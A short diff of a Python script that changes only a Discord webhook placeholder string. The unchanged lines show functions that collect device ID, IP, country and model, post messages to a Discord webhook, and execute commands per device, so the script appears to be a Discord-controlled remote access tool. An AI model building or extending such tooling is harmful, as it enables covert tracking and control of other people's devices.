@@ -27,7 +27,7 @@ def get_device_info():
         return {"id": "unknown", "ip": "unknown", "country": "unknown", "model": "unknown"}
 
 def send_to_discord(message):
-    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+    webhook_url = "your discord webhook URL (put it here)"
     requests.post(webhook_url, json={"content": message})
 
 def execute_command(command, device_id):
